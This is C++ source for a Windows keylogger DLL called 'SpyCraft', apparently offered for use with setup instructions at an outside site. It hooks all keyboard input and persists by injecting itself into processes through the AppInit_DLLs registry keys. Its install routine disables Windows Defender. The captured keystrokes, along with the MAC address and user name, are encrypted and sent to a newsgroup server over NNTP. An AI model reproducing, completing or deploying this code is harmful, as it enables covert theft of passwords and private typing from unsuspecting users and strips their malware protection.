#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#include <shlwapi.h>	// SHSetValueW

#include "Logger.h"
#include "helpers.h"


std::string		g_buf; // Once this string's length() is greater than 'upload_once_this_many_bytes_are_captured', it is reported
std::string		g_otp;
std::string		g_nntpGroup;
std::string		g_nntpServer;
std::string		g_nntpSubject;
std::wstring	g_strLoader;
HHOOK			m_hook = NULL;

const size_t	upload_once_this_many_bytes_are_captured = 1024; // you can make this smaller for debugging

#define			shift 16
#define			ctrl  17
#define			alt   18
#define			caps  20


#ifdef _MANAGED
#pragma managed(push, off)
#endif

// Needs to be full path to DLL
// Using %SystemRoot%\system32\ will not work
const std::wstring kstr64Release(helpers::GetSystemDir() + L"\\SpyCraft3264R.dll");
const std::wstring kstr32Release(helpers::GetSystemDir() + L"\\SpyCraft32R.dll");


bool send(char* in_buf, const SOCKET in_s)
{
	return SOCKET_ERROR != send(in_s, in_buf, strlen(in_buf), 0);
}

// If no incoming data is available at the socket, the recv call blocks and waits for data to arrive 
bool receive(const SOCKET in_s)
{
	char szBuffer[4096+1] = { 0 };

	const int nRet = recv(in_s, szBuffer, 4096, 0);

	if (nRet == SOCKET_ERROR)
	{
		return false;
	}

	// Did the server close the connection?
	// If the connection has been gracefully closed, the return value is zero
	if (nRet == 0)
		return false;	

	// Log received data, it is in 'szBuffer'

	Logger::GetInstance().LogEvent(EVENTLOG_SUCCESS, L"Server response [%s]", helpers::Ansi2wide(szBuffer).c_str());

	return true;	
}


void
PerformAsyncReport(const std::string& in_buf)
{
	// TODO, in another thread


	// MSDev needs this line if attaching to notepad.exe..or else it freezes...UnhookWindowsHookEx(m_hook); 

	std::string strWorkingBuf (in_buf);

	strWorkingBuf += " Mac => ";
	strWorkingBuf += helpers::getMac(); // The IP should be in the header on the posting, no need to add it here
	strWorkingBuf += "\r\n";
	
	strWorkingBuf += " Time => ";
	strWorkingBuf += helpers::GetCurrentTimeFormatted("%A %B-%d-%y %H.%M.%S"); // The time should be in the posting also, this is for newbs who don't know that
	strWorkingBuf += "\r\n";

	strWorkingBuf += " User => ";
	strWorkingBuf += helpers::getUserName();
	strWorkingBuf += "\r\n";

	strWorkingBuf += " Loader => ";
	strWorkingBuf += helpers::wide2Ansi(g_strLoader);
	strWorkingBuf += "\r\n";

	
	// encrypt data
	unsigned char* encryptedbuf = 0;
	size_t encryptedSize = 0;
	if(helpers::SymEncryptBuf( strWorkingBuf.c_str(), strWorkingBuf.size(), (void**)&encryptedbuf, encryptedSize, g_otp.c_str() ))
	{
		// The CryptBinaryToString function converts an array of bytes into a formatted string.
		CHAR pb[32768] = {0};
		DWORD siz_pb = 32000;
		if(CryptBinaryToStringA(encryptedbuf, encryptedSize, CRYPT_STRING_HEX, pb, &siz_pb))
		{
			const std::string x( (char*)pb, siz_pb );
			Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"[%s] is now encrypted as [%s] and ready for uploading to [%s] [%s]", helpers::Ansi2wide(strWorkingBuf).c_str(), helpers::Ansi2wide(x).c_str(), helpers::Ansi2wide(g_nntpServer).c_str(), helpers::Ansi2wide(g_nntpGroup).c_str());

			// networking part
			WORD wVersionRequested = MAKEWORD( 2, 2 );
			WSADATA wsaData = { 0 }; 

			if(WSAStartup(MAKEWORD(2,2), &wsaData ) == 0 )
			{
				// DNS on the server, eg: "news.microsoft.com"

				IN_ADDR		iaHost = { 0 };
				LPHOSTENT	lpHostEntry = { 0 };

				iaHost.s_addr = inet_addr(g_nntpServer.c_str());
				if (iaHost.s_addr == INADDR_NONE)
				{
					// Wasn't an IP address string, assume it is a name
					lpHostEntry = gethostbyname(g_nntpServer.c_str());
				}
				else
				{
					// It was a valid IP address string
					lpHostEntry = gethostbyaddr((const char *)&iaHost, sizeof(struct in_addr), AF_INET);
				}

				if(lpHostEntry != NULL)
				{
					SOCKET	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //  The socket that is created will have the overlapped attribute as a default. Sockets without the overlapped attribute can be created by using WSASocket.

					if (Socket != INVALID_SOCKET)
					{
						// Fill in the server address structure
						SOCKADDR_IN saServer = { 0 };
						saServer.sin_port = htons(119);
						saServer.sin_family = AF_INET;
						saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);

						// Connect the socket	
						const int nRet = connect(Socket, (LPSOCKADDR)&saServer, sizeof(SOCKADDR_IN));

						if (nRet != SOCKET_ERROR)
						{
							if(send("POST\r\n", Socket))
							{
								if(receive(Socket)) // Could be an error message..so what, what are my options? quitting, or proceeding. Will proceed.
								{
									char buf[4096+1] = { 0 };

									// Three parts, in order: newsgroup, subject, and of course message body
									_snprintf(buf, _countof(buf), "From: \"spycraft\" <spycraft@superconfigure.com>\r\nNewsgroups: %s\r\nSubject: %s\r\n\r\n%s\r\n.\r\n", g_nntpGroup.c_str(), g_nntpSubject.c_str(), x.c_str() );

									//if(send("From: \"spycraft\" <spycraft@superconfigure.com>\r\nNewsgroups: microsoft.public.nntp.test\r\nSubject: spycraft\r\n\r\nComverse Actionable Intelligence\r\nNigeria\r\nBugs\r\n.\r\n", Socket))
									if(send(buf, Socket))
									{
										receive(Socket); // article can be rejected, no sense in trying to re-try
									}
									else
									{
										Logger::GetInstance().LogEvent(EVENTLOG_ERROR_TYPE, L"send failed");
									}
								}
								else
								{
									Logger::GetInstance().LogEvent(EVENTLOG_ERROR_TYPE, L"recv failed");
								}
							}
							else
							{
								Logger::GetInstance().LogEvent(EVENTLOG_ERROR_TYPE, L"send failed");
							}
						}
						else
						{
							Logger::GetInstance().LogEvent(EVENTLOG_ERROR_TYPE, L"connect failed");
						}



						//To assure that all data is sent and received on a connection, an application should call shutdown before calling closesocket
						shutdown(Socket, SD_BOTH);
						closesocket(Socket);
					}
					else
					{
						Logger::GetInstance().LogEvent(EVENTLOG_ERROR_TYPE, L"socket failed");
					}
				}
				else
				{
					Logger::GetInstance().LogEvent(EVENTLOG_ERROR_TYPE, L"gethostbyname failed");
				}


				WSACleanup();
			}
		}
		else
			Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"CryptBinaryToStringA failed");
	}
	else
		Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"SymEncryptBuf failed");
}

// Be quick here, start another thread to do the networking becuse we are currently in a hooking callback, and return ASAP
void
Report(const char* in_XtraData = NULL)
{
	if(g_buf.empty()) return;

	PerformAsyncReport(g_buf);

	g_buf = ""; // We reset the buffer back to 0, and continue logging
}



/*
wParam
[in] Specifies the virtual-key code of the key that generated the keystroke message.

lParam
[in] Specifies the repeat count, scan code, extended-key flag, context code, previous key-state flag, and transition-state flag. 
     For more information about the lParam parameter, see Keystroke Message Flags. 
	 This parameter can be one or more of the following values. 

0-15
Specifies the repeat count. 
The value is the number of times the keystroke is repeated as a result of the user's holding down the key.

16-23
Specifies the scan code. 
The value depends on the OEM.

24
Specifies whether the key is an extended key, such as a function key or a key on the numeric keypad. 
The value is 1 if the key is an extended key; otherwise, it is 0.

25-28
Reserved.

29
Specifies the context code. 
The value is 1 if the ALT key is down; otherwise, it is 0.

30
Specifies the previous key state. 
The value is 1 if the key is down before the message is sent; it is 0 if the key is up.

31
Specifies the transition state. 
The value is 0 if the key is being pressed and 1 if it is being released.
*/

LRESULT CALLBACK kProc(int code, WPARAM wParam, LPARAM lParam)
{
	if(m_hook)
	{
		if(HC_ACTION == code)
		{
			if( (shift == wParam) || (ctrl == wParam) || (alt == wParam) || (caps == wParam) )
			{				
				if(shift == wParam) g_buf += "shift ";
				if(ctrl == wParam)	g_buf += "ctrl ";
				if(alt == wParam)	g_buf += "alt ";
				if(caps == wParam)	g_buf += "caps ";

				if( !helpers::is_bit_on(lParam, 31) )
					g_buf += "Down, ";
				else
					g_buf += "Up, ";
			}
			else if(!helpers::is_bit_on(lParam, 31)) // lets ignore keys going up, except for those above, so we can see capital letters entered
			{
				static char buffer[65] = { 0 };				 
				g_buf += _itoa(wParam, buffer, 10);
				g_buf += ", "; // each logged key is separated by a comma (we could use \r\n but it takes up more space for nothing)
			}			

			if(g_buf.length() >= upload_once_this_many_bytes_are_captured)
				Report();
		}
		return CallNextHookEx(m_hook, code, wParam, lParam);
	}
	return CallNextHookEx(0, code, wParam, lParam);
}



// The 64-bit DLL will properly write to the proper registry keys to install both 64, and 32-bit DLLs
// the 32-bit DLL will only     write to the proper registry keys to install a 32-bit DLL
// Note, the path to DLL in the registry should be the entire path
#ifdef __cplusplus
extern "C" {
#endif

	__declspec(dllexport) bool
	InstallMyself()
	{		

		helpers::DisableDefender();

	#if defined(_WIN64) 

		bool bRet = (ERROR_SUCCESS == SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",              L"AppInit_DLLs", REG_SZ, kstr64Release.c_str(), kstr64Release.size()*2));

		if(          ERROR_SUCCESS != SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"AppInit_DLLs", REG_SZ, kstr32Release.c_str(), kstr32Release.size()*2))
			bRet = false;


		DWORD dwValue = 1;
		if(ERROR_SUCCESS != SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",              L"LoadAppInit_DLLs", REG_DWORD, (unsigned char*)&dwValue, sizeof( DWORD )))
			bRet = false;

		dwValue = 1;
		if(ERROR_SUCCESS != SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows", L"LoadAppInit_DLLs", REG_DWORD, (unsigned char*)&dwValue, sizeof( DWORD )))
			bRet = false;
	#else

		bool bRet = (ERROR_SUCCESS == SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",    L"AppInit_DLLs", REG_SZ, kstr32Release.c_str(), kstr32Release.size()*2));

		DWORD dwValue = 1;
		if(ERROR_SUCCESS != SHSetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",              L"LoadAppInit_DLLs", REG_DWORD, (unsigned char*)&dwValue, sizeof( DWORD )))
			bRet = false;

	#endif

		MessageBox(NULL, bRet?"OK":"FAIL", "superconfigure.com", bRet?MB_OK:MB_ICONSTOP);

		return bRet;
	}

#ifdef __cplusplus
}
#endif



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)   
	{
		case DLL_PROCESS_ATTACH:
		{			
			DisableThreadLibraryCalls( (HMODULE)hModule );

			wchar_t pszLoader[MAX_PATH+2] = { 0 };
			GetModuleFileNameW(NULL, pszLoader, MAX_PATH);
			_wcslwr(pszLoader);

			// Probable installation
			if( (NULL != wcsstr(pszLoader, L"rundll32.exe") ))
			{
				const std::wstring iniFile(helpers::GetPathToSharedData());
				if(!helpers::DoesFileOrDirExist(iniFile))
					MessageBoxW(NULL, iniFile.c_str(), L"spycraft.ini MUST reside in %SystemRoot%\\system32, same as spycraft.dll. Re-read instructions at superconfigure.com", MB_ICONSTOP);
				else
					MessageBoxW(NULL, iniFile.c_str(), L"Operating under the directives from this INI file. Instructions at superconfigure.com", MB_OK);

				return TRUE;
			}
			
			// 1st, get the log file name
			std::wstring strLog;
			helpers::getSharedInfo(L"spycraft", L"DEBUGLOG", strLog, L"");

			// 2nd, set the log file name
			Logger::GetInstance().SetFile(strLog);

			// 3rd, get the exclusion list
			std::vector<std::wstring> vecExcluded;
			helpers::getSharedInfo(L"excluded", vecExcluded);	

			// 4th, compare the current process name with that from the list read from the file
			for each(std::wstring s in vecExcluded)
			{
				Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"Checking if this process is one excluded, [%s]", s.c_str());

				if( (NULL != wcsstr(pszLoader, s.c_str()) ))
				{
					Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"Not Loading Spycraft, exception match [%s]", pszLoader);
					return FALSE;
				}
			}

			// 5th, get the debugging file name, if it exists load only that one
			std::wstring strIncluded;
			helpers::getSharedInfo(L"included", L"DEBUGAPP", strIncluded, L"");

			if(strIncluded.size())
			{
				if( (NULL != wcsstr(pszLoader, strIncluded.c_str()) ))
				{
					Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"Loading Spycraft, you have specified a DEBUGAPP entry [%s] and this is it [%s]", strIncluded.c_str(), pszLoader);
				}
				else
				{
					Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"Not Loading Spycraft, you have specified a DEBUGAPP entry [%s] and this is not it [%s]. All others are not injected.", strIncluded.c_str(), pszLoader);
					return FALSE;
				}
			}

			// 6th, verify mandatory settings are present in spycraft.ini	
			// Notably, the OTP, a server name, a Group name, and subject line; any other is optional.
			helpers::getSharedInfo("spycraft", "OTP", g_otp, "");
			if(g_otp.empty())
			{
				Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"No OTP passphrase in [%s], not doing anything this is mandatory", helpers::GetPathToSharedData().c_str());
				return FALSE;
			}

			helpers::getSharedInfo("spycraft", "GROUP", g_nntpGroup, "");
			if(g_nntpGroup.empty())
			{
				Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"No GROUP in [%s], not doing anything this is mandatory", helpers::GetPathToSharedData().c_str());
				return FALSE;
			}

			helpers::getSharedInfo("spycraft", "NNTP", g_nntpServer, "");
			if(g_nntpServer.empty())
			{
				Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"No NNTP in [%s], not doing anything this is mandatory", helpers::GetPathToSharedData().c_str());
				return FALSE;
			}

			helpers::getSharedInfo("spycraft", "SUBJECT", g_nntpSubject, "");
			if(g_nntpSubject.empty())
			{
				Logger::GetInstance().LogEvent( EVENTLOG_ERROR_TYPE, L"No NNTP Subject in [%s], not doing anything this is mandatory", helpers::GetPathToSharedData().c_str());
				return FALSE;
			}

			Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"Loading Spycraft, [%s]", pszLoader);

			g_strLoader = pszLoader;
			
			// Disabled at installation only
			// helpers::DisableDefender();

			if(!m_hook) m_hook = SetWindowsHookEx(WH_KEYBOARD, kProc, (HINSTANCE)hModule, 0 /* the hook procedure is associated with all existing threads running in the same desktop as the calling thread. */);

			break;
		}
		case DLL_PROCESS_DETACH:
			if(m_hook)
			{
				//Logger::GetInstance().LogEvent( EVENTLOG_SUCCESS, L"UnLoading Spycraft, [%s]", pszLoader);
				UnhookWindowsHookEx(m_hook);
				m_hook = NULL;
				if(!g_buf.empty()) Report();
			}
			break;
	};


    return TRUE;
}



#ifdef _MANAGED
#pragma managed(pop)
#endif

